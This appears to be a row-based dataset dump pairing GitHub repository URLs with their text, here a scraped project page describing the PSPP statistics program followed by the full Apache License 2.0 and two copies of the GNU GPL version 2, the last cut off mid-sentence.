is a program for statistical analysis of sampled data  PSPP is a program for statistical analysis of sampled data. It is a free replacement for the proprietary program SPSS. PSPP has both text-based and graphical user interfaces.   Project page: https://www.gnu.org/software/pspp/ See changelog: https://git.savannah.gnu.org/gitweb/?p=pspp.git;a=shortlog;h=refs/heads/master   For known issues: https://savannah.gnu.org/bugs/?group=pspp For support: https://lists.gnu.org/archive/html/pspp-users/ or e-mail: pspp-users@gnu.org For bugs: https://lists.gnu.org/archive/html/bug-gnu-pspp/ or email: bug-gnu-pspp@gnu.org    Project Activities  Released/ 2018-07-07- For Testing Only/ used-in-build/buildpspp4windows.pl  Released/2018-07-For Testing Only/used-in-build/nsis/pspp.nsi  Released/2018-07-07-For Testing Only/used-in-build/nsis/MUI _ExtraPages.nsh    Rate This ProjectRate this Project:12345 5.0 out of 5 stars ‚òÖ‚òÖ‚òÖ‚òÖ‚òÖ ‚òÖ‚òÖ‚òÖ‚òÖ ‚òÖ‚òÖ‚òÖ ‚òÖ‚òÖ ‚òÖ    A cross-platform statistical package for econometric analysis SalStat Statistics Package SalStat is a small application for statistical analysis emphasising the sciences... SOFA Statistics SOFA is a statistics, analysis, and reporting program with an emphasis on ease of... statistical lab software download video editor @sfnet_ops Create a Project Open Source Software Business Software     Saturnrem Android Statistics Copyright¬© 2017-2045  All Rights Reserved.",,1
0,https://github.com/katvasoft-oy/ldap-util.git,"                                 Apache License                            Version 2.0, January 2004                         http://www.apache.org/licenses/     TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION     1. Definitions.        ""License"" shall mean the terms and conditions for use, reproduction,       and distribution as defined by Sections 1 through 9 of this document.        ""Licensor"" shall mean the copyright owner or entity authorized by       the copyright owner that is granting the License.        ""Legal Entity"" shall mean the union of the acting entity and all       other entities that control, are controlled by, or are under common       control with that entity. For the purposes of this definition,       ""control"" means (i) the power, direct or indirect, to cause the       direction or management of such entity, whether by contract or       otherwise, or (ii) ownership of fifty percent (50%) or more of the       outstanding shares, or (iii) beneficial ownership of such entity.        ""You"" (or ""Your"") shall mean an individual or Legal Entity       exercising permissions granted by this License.        ""Source"" form shall mean the preferred form for making modifications,       including but not limited to software source code, documentation       source, and configuration files.        ""Object"" form shall mean any form resulting from mechanical       transformation or translation of a Source form, including but       not limited to compiled object code, generated documentation,       and conversions to other media types.        ""Work"" shall mean the work of authorship, whether in Source or       Object form, made available under the License, as indicated by a       copyright notice that is included in or attached to the work       (an example is provided in the Appendix below).        ""Derivative Works"" shall mean any work, whether in Source or Object       form, that is based on (or derived from) the Work and for which the       editorial revisions, annotations, elaborations, or other modifications       represent, as a whole, an original work of authorship. For the purposes       of this License, Derivative Works shall not include works that remain       separable from, or merely link (or bind by name) to the interfaces of,       the Work and Derivative Works thereof.        ""Contribution"" shall mean any work of authorship, including       the original version of the Work and any modifications or additions       to that Work or Derivative Works thereof, that is intentionally       submitted to Licensor for inclusion in the Work by the copyright owner       or by an individual or Legal Entity authorized to submit on behalf of       the copyright owner. For the purposes of this definition, ""submitted""       means any form of electronic, verbal, or written communication sent       to the Licensor or its representatives, including but not limited to       communication on electronic mailing lists, source code control systems,       and issue tracking systems that are managed by, or on behalf of, the       Licensor for the purpose of discussing and improving the Work, but       excluding communication that is conspicuously marked or otherwise       designated in writing by the copyright owner as ""Not a Contribution.""        ""Contributor"" shall mean Licensor and any individual or Legal Entity       on behalf of whom a Contribution has been received by Licensor and       subsequently incorporated within the Work.     2. Grant of Copyright License. Subject to the terms and conditions of       this License, each Contributor hereby grants to You a perpetual,       worldwide, non-exclusive, no-charge, royalty-free, irrevocable       copyright license to reproduce, prepare Derivative Works of,       publicly display, publicly perform, sublicense, and distribute the       Work and such Derivative Works in Source or Object form.     3. Grant of Patent License. Subject to the terms and conditions of       this License, each Contributor hereby grants to You a perpetual,       worldwide, non-exclusive, no-charge, royalty-free, irrevocable       (except as stated in this section) patent license to make, have made,       use, offer to sell, sell, import, and otherwise transfer the Work,       where such license applies only to those patent claims licensable       by such Contributor that are necessarily infringed by their       Contribution(s) alone or by combination of their Contribution(s)       with the Work to which such Contribution(s) was submitted. If You       institute patent litigation against any entity (including a       cross-claim or counterclaim in a lawsuit) alleging that the Work       or a Contribution incorporated within the Work constitutes direct       or contributory patent infringement, then any patent licenses       granted to You under this License for that Work shall terminate       as of the date such litigation is filed.     4. Redistribution. You may reproduce and distribute copies of the       Work or Derivative Works thereof in any medium, with or without       modifications, and in Source or Object form, provided that You       meet the following conditions:        (a) You must give any other recipients of the Work or           Derivative Works a copy of this License; and        (b) You must cause any modified files to carry prominent notices           stating that You changed the files; and        (c) You must retain, in the Source form of any Derivative Works           that You distribute, all copyright, patent, trademark, and           attribution notices from the Source form of the Work,           excluding those notices that do not pertain to any part of           the Derivative Works; and        (d) If the Work includes a ""NOTICE"" text file as part of its           distribution, then any Derivative Works that You distribute must           include a readable copy of the attribution notices contained           within such NOTICE file, excluding those notices that do not           pertain to any part of the Derivative Works, in at least one           of the following places: within a NOTICE text file distributed           as part of the Derivative Works; within the Source form or           documentation, if provided along with the Derivative Works; or,           within a display generated by the Derivative Works, if and           wherever such third-party notices normally appear. The contents           of the NOTICE file are for informational purposes only and           do not modify the License. You may add Your own attribution           notices within Derivative Works that You distribute, alongside           or as an addendum to the NOTICE text from the Work, provided           that such additional attribution notices cannot be construed           as modifying the License.        You may add Your own copyright statement to Your modifications and       may provide additional or different license terms and conditions       for use, reproduction, or distribution of Your modifications, or       for any such Derivative Works as a whole, provided Your use,       reproduction, and distribution of the Work otherwise complies with       the conditions stated in this License.     5. Submission of Contributions. Unless You explicitly state otherwise,       any Contribution intentionally submitted for inclusion in the Work       by You to the Licensor shall be under the terms and conditions of       this License, without any additional terms or conditions.       Notwithstanding the above, nothing herein shall supersede or modify       the terms of any separate license agreement you may have executed       with Licensor regarding such Contributions.     6. Trademarks. This License does not grant permission to use the trade       names, trademarks, service marks, or product names of the Licensor,       except as required for reasonable and customary use in describing the       origin of the Work and reproducing the content of the NOTICE file.     7. Disclaimer of Warranty. Unless required by applicable law or       agreed to in writing, Licensor provides the Work (and each       Contributor provides its Contributions) on an ""AS IS"" BASIS,       WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or       implied, including, without limitation, any warranties or conditions       of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A       PARTICULAR PURPOSE. You are solely responsible for determining the       appropriateness of using or redistributing the Work and assume any       risks associated with Your exercise of permissions under this License.     8. Limitation of Liability. In no event and under no legal theory,       whether in tort (including negligence), contract, or otherwise,       unless required by applicable law (such as deliberate and grossly       negligent acts) or agreed to in writing, shall any Contributor be       liable to You for damages, including any direct, indirect, special,       incidental, or consequential damages of any character arising as a       result of this License or out of the use or inability to use the       Work (including but not limited to damages for loss of goodwill,       work stoppage, computer failure or malfunction, or any and all       other commercial damages or losses), even if such Contributor       has been advised of the possibility of such damages.     9. Accepting Warranty or Additional Liability. While redistributing       the Work or Derivative Works thereof, You may choose to offer,       and charge a fee for, acceptance of support, warranty, indemnity,       or other liability obligations and/or rights consistent with this       License. However, in accepting such obligations, You may act only       on Your own behalf and on Your sole responsibility, not on behalf       of any other Contributor, and only if You agree to indemnify,       defend, and hold each Contributor harmless for any liability       incurred by, or claims asserted against, such Contributor by reason       of your accepting any such warranty or additional liability.     END OF TERMS AND CONDITIONS     APPENDIX: How to apply the Apache License to your work.        To apply the Apache License to your work, attach the following       boilerplate notice, with the fields enclosed by brackets ""[]""       replaced with your own identifying information. (Don\'t include       the brackets!)  The text should be enclosed in the appropriate       comment syntax for the file format. We also recommend that a       file or class name and description of purpose be included on the       same ""printed page"" as the copyright notice for easier       identification within third-party archives.     Copyright [yyyy] [name of copyright owner]     Licensed under the Apache License, Version 2.0 (the ""License"");    you may not use this file except in compliance with the License.    You may obtain a copy of the License at         http://www.apache.org/licenses/LICENSE-2.0     Unless required by applicable law or agreed to in writing, software    distributed under the License is distributed on an ""AS IS"" BASIS,    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.    See the License for the specific language governing permissions and    limitations under the License.",,1
0,https://github.com/Bacter777/gpl-license.git,"                    GNU GENERAL PUBLIC LICENSE                        Version 2, June 1991   Copyright (C) 1989, 1991 Free Software Foundation, Inc.,  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The licenses for most software are designed to take away your freedom to share and change it.  By contrast, the GNU General Public License is intended to guarantee your freedom to share and change free software--to make sure the software is free for all its users.  This General Public License applies to most of the Free Software Foundation\'s software and to any other program whose authors commit to using it.  (Some other Free Software Foundation software is covered by the GNU Lesser General Public License instead.)  You can apply it to your programs, too.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for this service if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs; and that you know you can do these things.    To protect your rights, we need to make restrictions that forbid anyone to deny you these rights or to ask you to surrender the rights. These restrictions translate to certain responsibilities for you if you distribute copies of the software, or if you modify it.    For example, if you distribute copies of such a program, whether gratis or for a fee, you must give the recipients all the rights that you have.  You must make sure that they, too, receive or can get the source code.  And you must show them these terms so they know their rights.    We protect your rights with two steps: (1) copyright the software, and (2) offer you this license which gives you legal permission to copy, distribute and/or modify the software.    Also, for each author\'s protection and ours, we want to make certain that everyone understands that there is no warranty for this free software.  If the software is modified by someone else and passed on, we want its recipients to know that what they have is not the original, so that any problems introduced by others will not reflect on the original authors\' reputations.    Finally, any free program is threatened constantly by software patents.  We wish to avoid the danger that redistributors of a free program will individually obtain patent licenses, in effect making the program proprietary.  To prevent this, we have made it clear that any patent must be licensed for everyone\'s free use or not licensed at all.    The precise terms and conditions for copying, distribution and modification follow.                      GNU GENERAL PUBLIC LICENSE    TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION    0. This License applies to any program or other work which contains a notice placed by the copyright holder saying it may be distributed under the terms of this General Public License.  The ""Program"", below, refers to any such program or work, and a ""work based on the Program"" means either the Program or any derivative work under copyright law: that is to say, a work containing the Program or a portion of it, either verbatim or with modifications and/or translated into another language.  (Hereinafter, translation is included without limitation in the term ""modification"".)  Each licensee is addressed as ""you"".  Activities other than copying, distribution and modification are not covered by this License; they are outside its scope.  The act of running the Program is not restricted, and the output from the Program is covered only if its contents constitute a work based on the Program (independent of having been made by running the Program). Whether that is true depends on what the Program does.    1. You may copy and distribute verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice and disclaimer of warranty; keep intact all the notices that refer to this License and to the absence of any warranty; and give any other recipients of the Program a copy of this License along with the Program.  You may charge a fee for the physical act of transferring a copy, and you may at your option offer warranty protection in exchange for a fee.    2. You may modify your copy or copies of the Program or any portion of it, thus forming a work based on the Program, and copy and distribute such modifications or work under the terms of Section 1 above, provided that you also meet all of these conditions:      a) You must cause the modified files to carry prominent notices     stating that you changed the files and the date of any change.      b) You must cause any work that you distribute or publish, that in     whole or in part contains or is derived from the Program or any     part thereof, to be licensed as a whole at no charge to all third     parties under the terms of this License.      c) If the modified program normally reads commands interactively     when run, you must cause it, when started running for such     interactive use in the most ordinary way, to print or display an     announcement including an appropriate copyright notice and a     notice that there is no warranty (or else, saying that you provide     a warranty) and that users may redistribute the program under     these conditions, and telling the user how to view a copy of this     License.  (Exception: if the Program itself is interactive but     does not normally print such an announcement, your work based on     the Program is not required to print an announcement.)  These requirements apply to the modified work as a whole.  If identifiable sections of that work are not derived from the Program, and can be reasonably considered independent and separate works in themselves, then this License, and its terms, do not apply to those sections when you distribute them as separate works.  But when you distribute the same sections as part of a whole which is a work based on the Program, the distribution of the whole must be on the terms of this License, whose permissions for other licensees extend to the entire whole, and thus to each and every part regardless of who wrote it.  Thus, it is not the intent of this section to claim rights or contest your rights to work written entirely by you; rather, the intent is to exercise the right to control the distribution of derivative or collective works based on the Program.  In addition, mere aggregation of another work not based on the Program with the Program (or with a work based on the Program) on a volume of a storage or distribution medium does not bring the other work under the scope of this License.    3. You may copy and distribute the Program (or a work based on it, under Section 2) in object code or executable form under the terms of Sections 1 and 2 above provided that you also do one of the following:      a) Accompany it with the complete corresponding machine-readable     source code, which must be distributed under the terms of Sections     1 and 2 above on a medium customarily used for software interchange; or,      b) Accompany it with a written offer, valid for at least three     years, to give any third party, for a charge no more than your     cost of physically performing source distribution, a complete     machine-readable copy of the corresponding source code, to be     distributed under the terms of Sections 1 and 2 above on a medium     customarily used for software interchange; or,      c) Accompany it with the information you received as to the offer     to distribute corresponding source code.  (This alternative is     allowed only for noncommercial distribution and only if you     received the program in object code or executable form with such     an offer, in accord with Subsection b above.)  The source code for a work means the preferred form of the work for making modifications to it.  For an executable work, complete source code means all the source code for all modules it contains, plus any associated interface definition files, plus the scripts used to control compilation and installation of the executable.  However, as a special exception, the source code distributed need not include anything that is normally distributed (in either source or binary form) with the major components (compiler, kernel, and so on) of the operating system on which the executable runs, unless that component itself accompanies the executable.  If distribution of executable or object code is made by offering access to copy from a designated place, then offering equivalent access to copy the source code from the same place counts as distribution of the source code, even though third parties are not compelled to copy the source along with the object code.    4. You may not copy, modify, sublicense, or distribute the Program except as expressly provided under this License.  Any attempt otherwise to copy, modify, sublicense or distribute the Program is void, and will automatically terminate your rights under this License. However, parties who have received copies, or rights, from you under this License will not have their licenses terminated so long as such parties remain in full compliance.    5. You are not required to accept this License, since you have not signed it.  However, nothing else grants you permission to modify or distribute the Program or its derivative works.  These actions are prohibited by law if you do not accept this License.  Therefore, by modifying or distributing the Program (or any work based on the Program), you indicate your acceptance of this License to do so, and all its terms and conditions for copying, distributing or modifying the Program or works based on it.    6. Each time you redistribute the Program (or any work based on the Program), the recipient automatically receives a license from the original licensor to copy, distribute or modify the Program subject to these terms and conditions.  You may not impose any further restrictions on the recipients\' exercise of the rights granted herein. You are not responsible for enforcing compliance by third parties to this License.    7. If, as a consequence of a court judgment or allegation of patent infringement or for any other reason (not limited to patent issues), conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot distribute so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not distribute the Program at all.  For example, if a patent license would not permit royalty-free redistribution of the Program by all those who receive copies directly or indirectly through you, then the only way you could satisfy both it and this License would be to refrain entirely from distribution of the Program.  If any portion of this section is held invalid or unenforceable under any particular circumstance, the balance of the section is intended to apply and the section as a whole is intended to apply in other circumstances.  It is not the purpose of this section to induce you to infringe any patents or other property right claims or to contest validity of any such claims; this section has the sole purpose of protecting the integrity of the free software distribution system, which is implemented by public license practices.  Many people have made generous contributions to the wide range of software distributed through that system in reliance on consistent application of that system; it is up to the author/donor to decide if he or she is willing to distribute software through any other system and a licensee cannot impose that choice.  This section is intended to make thoroughly clear what is believed to be a consequence of the rest of this License.    8. If the distribution and/or use of the Program is restricted in certain countries either by patents or by copyrighted interfaces, the original copyright holder who places the Program under this License may add an explicit geographical distribution limitation excluding those countries, so that distribution is permitted only in or among countries not thus excluded.  In such case, this License incorporates the limitation as if written in the body of this License.    9. The Free Software Foundation may publish revised and/or new versions of the General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.  Each version is given a distinguishing version number.  If the Program specifies a version number of this License which applies to it and ""any later version"", you have the option of following the terms and conditions either of that version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of this License, you may choose any version ever published by the Free Software Foundation.    10. If you wish to incorporate parts of the Program into other free programs whose distribution conditions are different, write to the author to ask for permission.  For software which is copyrighted by the Free Software Foundation, write to the Free Software Foundation; we sometimes make exceptions for this.  Our decision will be guided by the two goals of preserving the free status of all derivatives of our free software and of promoting the sharing and reuse of software generally.                              NO WARRANTY    11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively convey the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      <one line to give the program\'s name and a brief idea of what it does.>     Copyright (C) <year>  <name of author>      This program is free software; you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation; either version 2 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License along     with this program; if not, write to the Free Software Foundation, Inc.,     51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.  Also add information on how to contact you by electronic and paper mail.  If the program is interactive, make it output a short notice like this when it starts in an interactive mode:      Gnomovision version 69, Copyright (C) year name of author     Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, the commands you use may be called something other than `show w\' and `show c\'; they could even be mouse-clicks or menu items--whatever suits your program.  You should also get your employer (if you work as a programmer) or your school, if any, to sign a ""copyright disclaimer"" for the program, if necessary.  Here is a sample; alter the names:    Yoyodyne, Inc., hereby disclaims all copyright interest in the program   `Gnomovision\' (which makes passes at compilers) written by James Hacker.    <signature of Ty Coon>, 1 April 1989   Ty Coon, President of Vice  This General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.",,1
0,https://github.com/murtagha/macroe.git,"                    GNU GENERAL PUBLIC LICENSE                        Version 2, June 1991   Copyright (C) 1989, 1991 Free Software Foundation, Inc.,  51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA  Everyone is permitted to copy and distribute verbatim copies  of this license document, but changing it is not allowed.                              Preamble    The licenses for most software are designed to take away your freedom to share and change it.  By contrast, the GNU General Public License is intended to guarantee your freedom to share and change free software--to make sure the software is free for all its users.  This General Public License applies to most of the Free Software Foundation\'s software and to any other program whose authors commit to using it.  (Some other Free Software Foundation software is covered by the GNU Lesser General Public License instead.)  You can apply it to your programs, too.    When we speak of free software, we are referring to freedom, not price.  Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for this service if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs; and that you know you can do these things.    To protect your rights, we need to make restrictions that forbid anyone to deny you these rights or to ask you to surrender the rights. These restrictions translate to certain responsibilities for you if you distribute copies of the software, or if you modify it.    For example, if you distribute copies of such a program, whether gratis or for a fee, you must give the recipients all the rights that you have.  You must make sure that they, too, receive or can get the source code.  And you must show them these terms so they know their rights.    We protect your rights with two steps: (1) copyright the software, and (2) offer you this license which gives you legal permission to copy, distribute and/or modify the software.    Also, for each author\'s protection and ours, we want to make certain that everyone understands that there is no warranty for this free software.  If the software is modified by someone else and passed on, we want its recipients to know that what they have is not the original, so that any problems introduced by others will not reflect on the original authors\' reputations.    Finally, any free program is threatened constantly by software patents.  We wish to avoid the danger that redistributors of a free program will individually obtain patent licenses, in effect making the program proprietary.  To prevent this, we have made it clear that any patent must be licensed for everyone\'s free use or not licensed at all.    The precise terms and conditions for copying, distribution and modification follow.                      GNU GENERAL PUBLIC LICENSE    TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION    0. This License applies to any program or other work which contains a notice placed by the copyright holder saying it may be distributed under the terms of this General Public License.  The ""Program"", below, refers to any such program or work, and a ""work based on the Program"" means either the Program or any derivative work under copyright law: that is to say, a work containing the Program or a portion of it, either verbatim or with modifications and/or translated into another language.  (Hereinafter, translation is included without limitation in the term ""modification"".)  Each licensee is addressed as ""you"".  Activities other than copying, distribution and modification are not covered by this License; they are outside its scope.  The act of running the Program is not restricted, and the output from the Program is covered only if its contents constitute a work based on the Program (independent of having been made by running the Program). Whether that is true depends on what the Program does.    1. You may copy and distribute verbatim copies of the Program\'s source code as you receive it, in any medium, provided that you conspicuously and appropriately publish on each copy an appropriate copyright notice and disclaimer of warranty; keep intact all the notices that refer to this License and to the absence of any warranty; and give any other recipients of the Program a copy of this License along with the Program.  You may charge a fee for the physical act of transferring a copy, and you may at your option offer warranty protection in exchange for a fee.    2. You may modify your copy or copies of the Program or any portion of it, thus forming a work based on the Program, and copy and distribute such modifications or work under the terms of Section 1 above, provided that you also meet all of these conditions:      a) You must cause the modified files to carry prominent notices     stating that you changed the files and the date of any change.      b) You must cause any work that you distribute or publish, that in     whole or in part contains or is derived from the Program or any     part thereof, to be licensed as a whole at no charge to all third     parties under the terms of this License.      c) If the modified program normally reads commands interactively     when run, you must cause it, when started running for such     interactive use in the most ordinary way, to print or display an     announcement including an appropriate copyright notice and a     notice that there is no warranty (or else, saying that you provide     a warranty) and that users may redistribute the program under     these conditions, and telling the user how to view a copy of this     License.  (Exception: if the Program itself is interactive but     does not normally print such an announcement, your work based on     the Program is not required to print an announcement.)  These requirements apply to the modified work as a whole.  If identifiable sections of that work are not derived from the Program, and can be reasonably considered independent and separate works in themselves, then this License, and its terms, do not apply to those sections when you distribute them as separate works.  But when you distribute the same sections as part of a whole which is a work based on the Program, the distribution of the whole must be on the terms of this License, whose permissions for other licensees extend to the entire whole, and thus to each and every part regardless of who wrote it.  Thus, it is not the intent of this section to claim rights or contest your rights to work written entirely by you; rather, the intent is to exercise the right to control the distribution of derivative or collective works based on the Program.  In addition, mere aggregation of another work not based on the Program with the Program (or with a work based on the Program) on a volume of a storage or distribution medium does not bring the other work under the scope of this License.    3. You may copy and distribute the Program (or a work based on it, under Section 2) in object code or executable form under the terms of Sections 1 and 2 above provided that you also do one of the following:      a) Accompany it with the complete corresponding machine-readable     source code, which must be distributed under the terms of Sections     1 and 2 above on a medium customarily used for software interchange; or,      b) Accompany it with a written offer, valid for at least three     years, to give any third party, for a charge no more than your     cost of physically performing source distribution, a complete     machine-readable copy of the corresponding source code, to be     distributed under the terms of Sections 1 and 2 above on a medium     customarily used for software interchange; or,      c) Accompany it with the information you received as to the offer     to distribute corresponding source code.  (This alternative is     allowed only for noncommercial distribution and only if you     received the program in object code or executable form with such     an offer, in accord with Subsection b above.)  The source code for a work means the preferred form of the work for making modifications to it.  For an executable work, complete source code means all the source code for all modules it contains, plus any associated interface definition files, plus the scripts used to control compilation and installation of the executable.  However, as a special exception, the source code distributed need not include anything that is normally distributed (in either source or binary form) with the major components (compiler, kernel, and so on) of the operating system on which the executable runs, unless that component itself accompanies the executable.  If distribution of executable or object code is made by offering access to copy from a designated place, then offering equivalent access to copy the source code from the same place counts as distribution of the source code, even though third parties are not compelled to copy the source along with the object code.    4. You may not copy, modify, sublicense, or distribute the Program except as expressly provided under this License.  Any attempt otherwise to copy, modify, sublicense or distribute the Program is void, and will automatically terminate your rights under this License. However, parties who have received copies, or rights, from you under this License will not have their licenses terminated so long as such parties remain in full compliance.    5. You are not required to accept this License, since you have not signed it.  However, nothing else grants you permission to modify or distribute the Program or its derivative works.  These actions are prohibited by law if you do not accept this License.  Therefore, by modifying or distributing the Program (or any work based on the Program), you indicate your acceptance of this License to do so, and all its terms and conditions for copying, distributing or modifying the Program or works based on it.    6. Each time you redistribute the Program (or any work based on the Program), the recipient automatically receives a license from the original licensor to copy, distribute or modify the Program subject to these terms and conditions.  You may not impose any further restrictions on the recipients\' exercise of the rights granted herein. You are not responsible for enforcing compliance by third parties to this License.    7. If, as a consequence of a court judgment or allegation of patent infringement or for any other reason (not limited to patent issues), conditions are imposed on you (whether by court order, agreement or otherwise) that contradict the conditions of this License, they do not excuse you from the conditions of this License.  If you cannot distribute so as to satisfy simultaneously your obligations under this License and any other pertinent obligations, then as a consequence you may not distribute the Program at all.  For example, if a patent license would not permit royalty-free redistribution of the Program by all those who receive copies directly or indirectly through you, then the only way you could satisfy both it and this License would be to refrain entirely from distribution of the Program.  If any portion of this section is held invalid or unenforceable under any particular circumstance, the balance of the section is intended to apply and the section as a whole is intended to apply in other circumstances.  It is not the purpose of this section to induce you to infringe any patents or other property right claims or to contest validity of any such claims; this section has the sole purpose of protecting the integrity of the free software distribution system, which is implemented by public license practices.  Many people have made generous contributions to the wide range of software distributed through that system in reliance on consistent application of that system; it is up to the author/donor to decide if he or she is willing to distribute software through any other system and a licensee cannot impose that choice.  This section is intended to make thoroughly clear what is believed to be a consequence of the rest of this License.    8. If the distribution and/or use of the Program is restricted in certain countries either by patents or by copyrighted interfaces, the original copyright holder who places the Program under this License may add an explicit geographical distribution limitation excluding those countries, so that distribution is permitted only in or among countries not thus excluded.  In such case, this License incorporates the limitation as if written in the body of this License.    9. The Free Software Foundation may publish revised and/or new versions of the General Public License from time to time.  Such new versions will be similar in spirit to the present version, but may differ in detail to address new problems or concerns.  Each version is given a distinguishing version number.  If the Program specifies a version number of this License which applies to it and ""any later version"", you have the option of following the terms and conditions either of that version or of any later version published by the Free Software Foundation.  If the Program does not specify a version number of this License, you may choose any version ever published by the Free Software Foundation.    10. If you wish to incorporate parts of the Program into other free programs whose distribution conditions are different, write to the author to ask for permission.  For software which is copyrighted by the Free Software Foundation, write to the Free Software Foundation; we sometimes make exceptions for this.  Our decision will be guided by the two goals of preserving the free status of all derivatives of our free software and of promoting the sharing and reuse of software generally.                              NO WARRANTY    11. BECAUSE THE PROGRAM IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR OR CORRECTION.    12. IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR REDISTRIBUTE THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.                       END OF TERMS AND CONDITIONS              How to Apply These Terms to Your New Programs    If you develop a new program, and you want it to be of the greatest possible use to the public, the best way to achieve this is to make it free software which everyone can redistribute and change under these terms.    To do so, attach the following notices to the program.  It is safest to attach them to the start of each source file to most effectively convey the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      <one line to give the program\'s name and a brief idea of what it does.>     Copyright (C) <year>  <name of author>      This program is free software; you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation; either version 2 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License along     with this program; if not, write to the Free Software Foundation, Inc.,     51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.  Also add information on how to contact you by electronic and paper mail.  If the program is interactive, make it output a short notice like this when it starts in an interactive mode:      Gnomovision version 69, Copyright (C) year name of author     Gnomovision comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you 